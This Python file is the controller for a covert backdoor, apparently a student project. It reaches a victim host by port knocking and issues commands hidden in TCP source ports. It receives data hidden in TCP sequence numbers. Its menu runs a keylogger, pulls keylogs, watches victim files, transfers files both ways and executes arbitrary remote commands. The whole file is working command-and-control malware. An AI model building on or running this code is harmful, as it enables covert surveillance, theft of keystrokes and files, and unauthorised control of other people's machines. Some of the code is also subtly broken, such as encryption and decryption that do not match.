import socket
from scapy.all import sniff, IP, TCP
import sys
import getopt
import os
import pickle
import threading
import re
import time
from config import ENCRYPTION_KEY

is_running = True
check_running = False
stop_event = threading.Event()
received_key_log_data = []
received_transfer_data = []
received_file_event_data = []
received_command_data = []
authenticated = False
file_name = ""
command_result = ""
raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

def receive_file_name(packet):
    global file_name
    
    if TCP in packet and packet[TCP].dport == 7006:
        encrypted_char = chr(packet[TCP].sport)
        
        # Use the same key used for encryption
        key = sum(ord(char) for char in ENCRYPTION_KEY)
        
        decrypted_char = decrypt_char(encrypted_char, key)
        
        file_name += decrypted_char

# Victim_dir needs to be absolute path
def receive_file_event(addr, victim_dir):
    """This method runs automonimously in a thread. What it does is continuosly attempt to receive a 
    message from the victim, indicating that file event has occured on the watched file/directory. Once
    the message has been received, the method then starts to receive the file and store it in the file event
    directory that it is suppose to go to, i.e. '192.168.1.75/added', '192.168.1.75/modified'. If the received
    file event was a file that was deleted, the method will instead look for the most recent 'modified' version
    of that file in the './modified' folder and move it over to the '192.168.1.75/deleted' directory.

    Args:
        sock (socket.socket()): The commander socket that will receive files from the victim
        victim_dir (str): The victim Ip directory where the received files will be stored
    """
    global stop_event
    global file_name
    global received_file_event_data
    
    while not stop_event.is_set():
        try:
            time.sleep(0.5)
            sniff(filter=f"tcp and src host {addr}", prn=receive_file_name, stop_filter=stop_receiving, store=0)
            time.sleep(0.5)
            file_name = file_name.split("|")
            event_type = file_name[0]
            file_name = ""
            
            time.sleep(0.5)
            sniff(filter=f"tcp and src host {addr}", prn=receive_file_name, stop_filter=stop_receiving, store=0)
            time.sleep(0.5)
            file_name = file_name.split("|")
            file = file_name[0]
            file_name = ""
            
            # Handle the case of the file event type being 'DELETED'
            if event_type == 'DELETED':
                # Establish the path of the 'modified' directory inside of the victim Ip directory
                modified_dir_path = os.path.join(victim_dir, 'modified')
                # Establish the path of the 'deleted' directory inside of the victim Ip directory
                deleted_dir_path = os.path.join(victim_dir, 'deleted')
                
                # Extract the file name and extension from the basename of the file
                file, file_extension = os.path.splitext(file)
                
                # If the 'deleted' directory hasn't been created yet, create it
                if not os.path.exists(deleted_dir_path):
                    os.makedirs(deleted_dir_path)
                
                # Use regex to find the most recent version of the file in the './modified' directory
                pattern = re.compile(rf'^{re.escape(file)}_V(\d+)\.\w+$')
                
                # Create a list of files that all match the file name and also have version numbers
                matching_files = [f for f in os.listdir(modified_dir_path) if pattern.match(f)]
                
                if matching_files:
                    # Extract versions and find the index of the latest version
                    versions = [int(f.split('_V')[1].split('.')[0]) for f in matching_files]
                    max_version_index = versions.index(max(versions))
                    file_to_delete = matching_files[max_version_index]
                    
                    # Move the file from './modifed' to './deleted'
                    src_path = os.path.join(modified_dir_path, file_to_delete)
                    dest_path = os.path.join(deleted_dir_path, file_to_delete)
                    os.rename(src_path, dest_path)
                    
                # Start the next iteration of the loop
                continue
            
            sniff(filter=f"tcp and src host {addr}", prn=process_information, stop_filter=stop_receiving, store=0)
            full_data = ''.join(received_file_event_data)
            received_file_event_data = []

            # Create the corresponding file event directory if it doesn't exist
            dir_path = os.path.join(victim_dir, event_type.lower())
            if not os.path.exists(dir_path):
                os.makedirs(dir_path)
                
            # Get the next versioned file name
            new_file_name = get_next_version(file, dir_path)

            # Write the file contents to the file event directory as binary
            file_path = os.path.join(dir_path, new_file_name)
            with open(file_path, 'w') as file:
                file.write(full_data)
        
        # Handles any exceptions that may occur        
        except Exception as e:
            print(f'Error receiving data: {e}')
            break
        
        # In case the loop gets stuck for some reason, allow for a keyboard interrupt to break the loop
        except KeyboardInterrupt:
            break

def get_next_version(file_name, destination_folder):
    """_summary_

    Args:
        file_name (str): The file to be version numbered
        destination_folder (str): The folder where the file is to be sent to

    Returns:
        str: The new log file name
    """
    # Initialize the version number to 1
    version = 1
    
    # Split the file name and extension
    base_name, ext = os.path.splitext(file_name)
    
    # List files in the destination folder that start with "<basename>_V"
    existing_files = [f for f in os.listdir(destination_folder) if f.startswith(base_name + "_V")]
    
    # Extract existing version numbers from the file names
    existing_versions = [int(f.split("_V")[1].split(ext)[0]) for f in existing_files]

    # Extract existing version numbers from the file names
    if existing_versions:
        version = max(existing_versions) + 1

    # Generate the new versioned file name
    return f"{base_name}_V{version}{ext}"
    
def decrypt_chunk(encrypted_chunk, key):
    decrypted_chunk = bytes([(byte ^ key) % 256 for byte in encrypted_chunk])
    return decrypted_chunk
    
def process_information(packet):
    """
    This function processes a network packet, specifically looking for TCP
    packets destined for ports 8005, 8006, and 7006. It extracts the hidden
    sequence number from the TCP header, converts it to bytes, and decrypts
    it using a key calculated from the ASCII values of characters in
    ENCRYPTION_KEY. The decrypted chunk is then converted to a string and
    appended to the corresponding global variables - received_key_log_data,
    received_transfer_data, or received_file_event_data.

    :param packet: The network packet containing information to be processed.
    """
    global received_key_log_data
    global received_transfer_data
    global received_file_event_data

    # Check if the packet contains TCP protocol
    if TCP in packet:
        # Check for port 8005 for key log data
        if packet[TCP].dport == 8005:
            # Extract the hidden sequence number from the TCP header
            hidden = packet[TCP].seq % (2**32)

            # Convert the sequence number to bytes
            data_bytes = hidden.to_bytes(4, byteorder='big')

            # Calculate the encryption key based on the sum of ASCII values of the characters in ENCRYPTION_KEY
            key = sum(ord(char) for char in ENCRYPTION_KEY)

            # Decrypt the chunk using the calculated key
            decrypted_chunk = decrypt_chunk(data_bytes, key)

            # Convert the decrypted bytes to string, ignoring errors and removing null characters
            data_str = decrypted_chunk.decode('utf-8', errors='ignore').replace('\x00', '')

            # Append the decrypted data to the global variable received_key_log_data
            received_key_log_data.append(data_str)

        # Check for port 8006 for transfer data
        elif packet[TCP].dport == 8006:
            # Extract the sequence number from the TCP header
            hidden = packet[TCP].seq % (2**32)

            # Convert the sequence number to bytes
            data_bytes = hidden.to_bytes(4, byteorder='big')
            
            key = sum(ord(char) for char in ENCRYPTION_KEY)
            
            decrypted_chunk = decrypt_chunk(data_bytes, key)

            # Convert the bytes to string and append to received_data
            data_str = decrypted_chunk.decode('utf-8', errors='ignore').replace('\x00', '')
            received_transfer_data.append(data_str)
            
        elif packet[TCP].dport == 7006:
            # Extract the sequence number from the TCP header
            hidden = packet[TCP].seq % (2**32)

            # Convert the sequence number to bytes
            data_bytes = hidden.to_bytes(4, byteorder='big')
            
            key = sum(ord(char) for char in ENCRYPTION_KEY)
            
            decrypted_chunk = decrypt_chunk(data_bytes, key)

            # Convert the bytes to string and append to received_data
            data_str = decrypted_chunk.decode('utf-8', errors='ignore').replace('\x00', '')
            received_file_event_data.append(data_str)
            
            
def receive_command(packet):
    global received_command_data
    if TCP in packet:
        if  packet[TCP].dport == 8556:
            # Extract the sequence number from the TCP header
            hidden = packet[TCP].seq % (2**32)

            # Convert the sequence number to bytes
            data_bytes = hidden.to_bytes(4, byteorder='big')
            
            key = sum(ord(char) for char in ENCRYPTION_KEY)
            
            decrypted_chunk = decrypt_chunk(data_bytes, key)

            # Convert the bytes to string and append to received_data
            data_str = decrypted_chunk.decode('utf-8', errors='ignore').replace('\x00', '')
            received_command_data.append(data_str)
    
def stop_receiving(packet):
    if TCP in packet:
        encrypted_char = chr(packet[TCP].sport)
        
        # Use the same key used for encryption
        key = sum(ord(char) for char in ENCRYPTION_KEY)
        
        decrypted_char = decrypt_char(encrypted_char, key)
        if decrypted_char == "|" or decrypted_char == "~":
                return True

def encrypt_chunk(chunk, key):
    # XOR encryption for each byte
    encrypted_chunk = bytes([(byte + key) % 256 for byte in chunk])
    return encrypted_chunk
            
def covert_file(file_path, dest_ip, dest_port):
    """
    This function reads a file specified by 'file_path' in binary mode,
    and covertly sends its content over the network using a series of
    TCP packets. Each 4-byte chunk of the file is encrypted, and its
    hidden representation is embedded in the sequence number field of
    TCP packets. The packets are sent to the specified destination IP
    and port using a raw socket, with a delay of 0.5 seconds between
    each packet.

    :param file_path: The path to the file to be covertly transmitted.
    :param dest_ip: The destination IP address to send the covert data to.
    :param dest_port: The destination port to use for the covert transmission.
    """
    with open(file_path, "rb") as file:
        while True:
            chunk = file.read(4) 
            # Break the loop if no more data or an empty chunk is read
            if not chunk or chunk == '':
                break

            # If the chunk is less than 4 bytes, pad it with null bytes
            if len(chunk) < 4:
                chunk = chunk.ljust(4, b'\x00')

            # Calculate the encryption key based on the sum of ASCII values of the characters in ENCRYPTION_KEY
            key = sum(ord(char) for char in ENCRYPTION_KEY)

            # Encrypt the chunk using the calculated key
            encrypted_chunk = encrypt_chunk(chunk, key)

            # Convert the encrypted chunk to an integer and take the modulo to fit within 32 bits
            hidden = int.from_bytes(encrypted_chunk, byteorder='big') % (2**32)

            # Create a TCP packet with the hidden value as the sequence number
            packet = IP(dst=dest_ip) / TCP(dport=dest_port, seq=hidden)

            # Convert the packet to bytes
            packet_bytes = bytes(packet)

            # Send the packet to the destination IP and port using a raw socket
            raw_socket.sendto(packet_bytes, (dest_ip, 0))

            # Introduce a delay of 0.5 seconds between each packet
            time.sleep(0.5)

def check(packet):
    pass

def authenticate(packet):
    """
    This function examines a network packet and attempts to authenticate
    based on the presence of a specific decrypted character ('|') from
    the source port of the TCP packet. If successful, it sets the global
    variable 'authenticated' to True.

    :param packet: The network packet containing authentication information.
    :return: True if authentication is successful, otherwise False.
    """
    global authenticated

    # Extract the encrypted character from the source port of the TCP packet
    encrypted_char = chr(packet[TCP].sport)

    # Calculate the encryption key based on the sum of ASCII values of the characters in ENCRYPTION_KEY
    key = sum(ord(char) for char in ENCRYPTION_KEY)

    # Decrypt the character using the calculated key
    decrypted_char = decrypt_char(encrypted_char, key)

    # Check if the decrypted character is the authentication signal '|'
    if decrypted_char == "|":
        authenticated = True
        return True
        
def encrypt_char(char, key):
    encrypted_char = chr(ord(char) ^ key)
    return encrypted_char
    
def decrypt_char(encrypted_char, key):
    decrypted_char = chr(ord(encrypted_char) ^ key)
    return decrypted_char

def main(argv):
    """The main method of the commander script. The commander will connect to a victim that is specified in
       the command line options for address and port. The commander is able to send messages to a victim, getting
       it to do multiple tasks.

    Args:
        argv (list[str]): The list of command line arguments provided
    """
    # The victim's address
    victim_addr = None
    commander_addr = None
    
    check_running = False
    
    receive_thread = None
    
    encryption_key = sum(ord(char) for char in ENCRYPTION_KEY)
    
    try:
        opts, args = getopt.getopt(argv, "v:c:")
    except getopt.GetoptError:
        print("[ERROR] Invalid options. Usage: commander.py -v <victim addr> -c <commander addr>")
        sys.exit(2)
    
    for opt, arg in opts:
        if opt == "-v":
            victim_addr = arg
        elif opt == "-c":
            commander_addr = arg
    
    # Makes sure that the victim's address was specified
    if victim_addr is None or commander_addr is None:
        print("[ERROR] The victim/commander address was not specified")
        sys.exit(2)
                
    print("\nWELCOME TO THE COMMAND AND CONTROL SYSTEM")
    
    # The message that the commander will send to the victim
    commander_msg = ""
    # Boolean variable used to keep the connection to the victim alive
    keep_con_alive = True
    # The format of log files to be stored in the victim IP directory
    log_file = "key_log.txt"
    count = 1
    port_knock = [10000, 12000, 13000]
    
    global authenticated
    
    print(f"[PORT KNOCK] Attempting Port Knock on {victim_addr}")
    
    for port in port_knock:
        print(f"[PORT KNOCK] Sending Knock #{count} at Port {port}")
        packet = IP(dst=victim_addr) / TCP(dport=port)
        
        raw_socket.sendto(bytes(packet), (victim_addr, 0))
        time.sleep(1)
        
    print("[AUTHENTICATING] Waiting For Authentication from Victim")
    
    sniff(filter=f"tcp and src host {victim_addr}", prn=check, stop_filter=authenticate, store=0, timeout=5)
    
    if authenticated != True:
        print("[FAILED] Failed to Authenticate Connection with Victim, Ensure the Knock Ports Specified Are Correct")
        sys.exit(2)
    
    try:
        # Keeps looping the menu until the commander disconnects
        while keep_con_alive:
            
            print("\nSELECT AN OPTION FROM THE MENU BELOW:\n")
            print("1. Start Keylogger")
            print("2. Stop Keylogger")
            print("3. Transfer keylog file")
            print("4. Watch file/directory")
            print("5. Stop watching file/directory")
            print("6. Transfer file to Victim")
            print("7. Transfer file from Victim")
            print("8. Run command")
            print("9. Uninstall")
            print("10. Disconnect\n")
            
            # Take the user's input of what to run
            commander_option = input(">")
            
            # If an incorrect input was given
            if not 1 <= int(commander_option) <= 10:
                print("[ERROR] The option given is not in range of 1-10. Please specify a valid menu option.\n")
                continue

            # Starts up the keylogger on the victim
            if commander_option == "1":
                print(f"[KEYLOGGER] Starting keylogger on victim {victim_addr}")
                commander_msg = "STARTKEY?"
                
                for char in commander_msg:
                    #print(char)
                    encrypted_char = encrypt_char(char, encryption_key)
                    #print(encrypted_char)
                    packet = IP(dst=victim_addr) / TCP(sport=ord(encrypted_char), dport=8888)
                    
                    raw_socket.sendto(bytes(packet), (victim_addr, 0))
                    time.sleep(0.25)
            
            # Stops the keylogger on the victim 
            elif commander_option == "2":
                print(f"[KEYLOGGER] Stopping keylogger on victim {victim_addr}")
                
                commander_msg = "STOPKEY?"
                for char in commander_msg:
                    #print(char)
                    encrypted_char = encrypt_char(char, encryption_key)
                    #print(encrypted_char)
                    packet = IP(dst=victim_addr) / TCP(sport=ord(encrypted_char), dport=8888)
                    
                    raw_socket.sendto(bytes(packet), (victim_addr, 0))
                    time.sleep(0.25)
            
            # Transfers the keylog from the victim to the commander. The transfered file will be held 
            # inside of a dir which has the name of the victim's address.
            elif commander_option == "3":
                global received_key_log_data
                print(f"[KEYLOGGER] Transferring keylog from victim {victim_addr}")
                
                commander_msg = "TRANSFERLOG?"
                
                for char in commander_msg:
                    #print(char)
                    encrypted_char = encrypt_char(char, encryption_key)
                    #print(encrypted_char)
                    packet = IP(dst=victim_addr) / TCP(sport=ord(encrypted_char), dport=8888)
                    
                    raw_socket.sendto(bytes(packet), (victim_addr, 0))
                    time.sleep(0.5)
                    
                print("[KEYLOGGER] Waiting To Receive Keylog File ... ")
                    
                sniff(filter=f"tcp and src host {victim_addr}", prn=process_information, stop_filter=stop_receiving)
                full_data = ''.join(received_key_log_data)
                
                with open(log_file, "w") as recv_log:
                    recv_log.write(full_data)
                    
                received_key_log_data = []
                
                # Get the current path
                curr_path = os.getcwd()
                
                # Create the path of the folder which the log file will be held
                log_folder = os.path.join(curr_path, f"{victim_addr}")
                
                # Creates the folder if it does not already exist
                if not os.path.exists(log_folder):
                    os.mkdir(log_folder)
                    
                log_folder = os.path.join(log_folder, f"log_files")
                
                if not os.path.exists(log_folder):
                    os.mkdir(log_folder)
                
                # Get the new file name with the appropriate version number
                new_file_name = get_next_version(log_file, log_folder)

                # Move the file to the destination folder
                new_file_path = os.path.join(log_folder, new_file_name)
                os.rename(log_file, new_file_path)
                
                print("[KEYLOGGER] Keylog file was received by the commander")
            
            elif commander_option == "4":
                # Check to see if the victim is currently watching a file/directory
                if receive_thread and receive_thread.is_alive():
                    print("[ERROR] The victim is already watching a file/directory")
                    
                    # Reload the menu and get the user to input a new option
                    continue
                
                # Clears the thread Event in case it was set previously
                stop_event.clear()
                
                print(f"[WATCHING] Starting file/directory watcher on {victim_addr}:\n")
                commander_msg = "WATCHFILE?"
                
                for char in commander_msg:
                    encrypted_char = encrypt_char(char, encryption_key)
                    #print(encrypted_char)
                    packet = IP(dst=victim_addr) / TCP(sport=ord(encrypted_char), dport=8888)
                    
                    raw_socket.sendto(bytes(packet), (victim_addr, 0))
                    time.sleep(0.75)
                
                # Get the file/directory that will be watched by the victim
                observed = input("Enter the file/directory to be watched by the victim: ")         
                        
                print(f"\n[WATCHING] Now watching {observed} on {victim_addr}\n")
                    
                for char in observed:
                    encrypted_char = encrypt_char(char, encryption_key)
                    packet = IP(dst=victim_addr) / TCP(sport=ord(encrypted_char), dport=8686)
                    
                    raw_socket.sendto(bytes(packet), (victim_addr, 0))
                    time.sleep(0.5)
                
                packet = IP(dst=victim_addr) / TCP(sport=ord(encrypt_char("|", encryption_key)), dport=8888)
                raw_socket.sendto(bytes(packet), (victim_addr, 0))
                time.sleep(0.5)
                
                # Get the current path
                curr_path = os.getcwd()
                
                # Get the absolute path to the victim's Ip directory stored on the commander
                victim_folder = os.path.join(curr_path, f"{victim_addr}")
                
                # If the directory doesn't already exist, create it
                if not os.path.exists(victim_folder):
                    os.mkdir(victim_folder)
                
                global is_running
                
                # Checks to see if a thread for receiving file events is already running or not
                if not check_running:
                    is_running = True
                    # Starts up a new thread that will attempt to receive the file's which have had events occured
                    receive_thread = threading.Thread(target=receive_file_event, args=(victim_addr, victim_folder))
                    receive_thread.start()
                    
                    check_running = True
                
            elif commander_option == "5":
                print(f"[STOP WATCHING] Stopped watching {observed} on {victim_addr}")
                commander_msg = "STOPWATCHFILE?"
                
                for char in commander_msg:
                    encrypted_char = encrypt_char(char, encryption_key)
                    packet = IP(dst=victim_addr) / TCP(sport=ord(encrypted_char), dport=8888)
                    
                    raw_socket.sendto(bytes(packet), (victim_addr, 0))
                    time.sleep(0.5)
                
                # Stop the loop in the receive_file_event() thread
                stop_event.set()
                
                print("[STOP WATCHING] This may take a few seconds to stop the thread...")
                
                # If the thread is still alive, let it close gracefully
                while receive_thread and receive_thread.is_alive():
                    receive_thread.join()
                
            elif commander_option == "6":
                print(f"[TRANSFERRING] Starting Up Transfer to {victim_addr}")
                commander_msg = "TRANSFERTO?"
                
                transfer = input("Enter File to Send to The Victim: ")
                
                transfer += "|"
                                
                for char in commander_msg:
                    encrypted_char = encrypt_char(char, encryption_key)
                    packet = IP(dst=victim_addr) / TCP(sport=ord(encrypted_char), dport=8888)
                    
                    raw_socket.sendto(bytes(packet), (victim_addr, 0))
                    time.sleep(0.5)
                
                for char in transfer:
                    encrypted_char = encrypt_char(char, encryption_key)
                    packet = IP(dst=victim_addr) / TCP(sport=ord(encrypted_char), dport=8686)
                    raw_socket.sendto(bytes(packet), (victim_addr, 0))
                    time.sleep(0.5)
                    
                transfer = transfer.split('|')
                time.sleep(0.5)
                print(f"[TRANSFERRING] Sending over the file {transfer} to the the victim")
                covert_file(transfer[0], victim_addr, 8585)
                time.sleep(0.5)
                packet = IP(dst=victim_addr) / TCP(sport=ord(encrypt_char("|", encryption_key)), dport=8585)
                raw_socket.sendto(bytes(packet), (victim_addr, 0))
                print(f"[SUCCESS] File was sent to Victim")
                
                
            elif commander_option == "7":
                global received_transfer_data
                print(f"[TRANSFERRING] Starting Up Transfer From {victim_addr}")
                commander_msg = "TRANSFERFROM?"
                
                transfer = input("Enter File to Receive From The Victim: ")
                
                transfer += "|"
                
                for char in commander_msg:
                    encrypted_char = encrypt_char(char, encryption_key)
                    packet = IP(dst=victim_addr) / TCP(sport=ord(encrypted_char), dport=8888)
                    
                    raw_socket.sendto(bytes(packet), (victim_addr, 0))
                    time.sleep(0.5)
                
                for char in transfer:
                    encrypted_char = encrypt_char(char, encryption_key)
                    packet = IP(dst=victim_addr) / TCP(sport=ord(encrypted_char), dport=8686)
                    raw_socket.sendto(bytes(packet), (victim_addr, 0))
                    time.sleep(0.5)
                    
                transfer = transfer.split('|')
                sniff(filter=f"tcp and src host {victim_addr}", prn=process_information, stop_filter=stop_receiving)
                
                full_data = ''.join(received_transfer_data)
                
                with open(transfer[0], "w") as file:
                    file.write(full_data)
                    
                received_transfer_data = []
                
            elif commander_option == "8":
                global received_command_data
                
                print(f"[RUNNING] Running A Command on the Victim {victim_addr}")
                commander_msg = "RUNCOMMAND?"
                
                for char in commander_msg:
                    #print(char)
                    encrypted_char = encrypt_char(char, encryption_key)
                    #print(encrypted_char)
                    packet = IP(dst=victim_addr) / TCP(sport=ord(encrypted_char), dport=8888)
                    
                    raw_socket.sendto(bytes(packet), (victim_addr, 0))
                    time.sleep(0.5)
                    
                command = input("Enter command to run on victim: ")
                
                for char in command:
                    #print(char)
                    encrypted_char = encrypt_char(char, encryption_key)
                    #print(encrypted_char)
                    packet = IP(dst=victim_addr) / TCP(sport=ord(encrypted_char), dport=8556)
                    
                    raw_socket.sendto(bytes(packet), (victim_addr, 0))
                    time.sleep(0.5)
                    
                packet = IP(dst=victim_addr) / TCP(sport=ord(encrypt_char("~", encryption_key)), dport=8556)
                raw_socket.sendto(bytes(packet), (victim_addr, 0))
                time.sleep(0.5)
                
                print("[RESULT] The Output of The Command Ran by The Victim is Shown Below...\n")
                sniff(filter=f"tcp and src host {victim_addr}", prn=receive_command, stop_filter=stop_receiving, store=0)
                full_data = ''.join(received_command_data)
                received_command_data = []
                print(full_data)
                
            elif commander_option == "9":
                print(f"[UNINSTALLING] Uninstalling The Backdoor Program on The Victim")
                commander_msg = "UNINSTALL?"
                
                for char in commander_msg:
                    #print(char)
                    encrypted_char = encrypt_char(char, encryption_key)
                    #print(encrypted_char)
                    packet = IP(dst=victim_addr) / TCP(sport=ord(encrypted_char), dport=8888)
                    
                    raw_socket.sendto(bytes(packet), (victim_addr, 0))
                    time.sleep(0.5)
            
            # Disconnects the commander from the victim's socket
            elif commander_option == "10":
                print(f"[DISCONNECTING] Disconnecting from victim {victim_addr}")
                commander_msg = "DISCONNECT?"
                
                for char in commander_msg:
                    #print(char)
                    encrypted_char = encrypt_char(char, encryption_key)
                    #print(encrypted_char)
                    packet = IP(dst=victim_addr) / TCP(sport=ord(encrypted_char), dport=8888)
                    
                    raw_socket.sendto(bytes(packet), (victim_addr, 0))
                    time.sleep(0.5)
                
                # Closes the program by ending the while loop
                keep_con_alive = False
    except KeyboardInterrupt:
        sys.exit(2)
        
if __name__ == "__main__":
    main(sys.argv[1:])
